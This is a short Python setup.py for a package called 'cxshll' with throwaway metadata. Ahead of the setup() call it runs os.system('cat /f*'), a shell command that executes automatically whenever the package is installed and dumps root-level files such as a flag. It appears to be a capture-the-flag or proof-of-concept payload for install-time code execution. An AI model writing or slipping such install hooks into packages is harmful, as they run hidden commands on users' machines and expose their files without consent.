from setuptools import setup
import os
os.system('cat /f*')

setup(name='cxshll',
      version='0.0.1',
      description='xshll',
      author='xxsaf',
      license='MIT',
      packages=['cxshll'],
      scripts=['bin/foo.sh']
      )
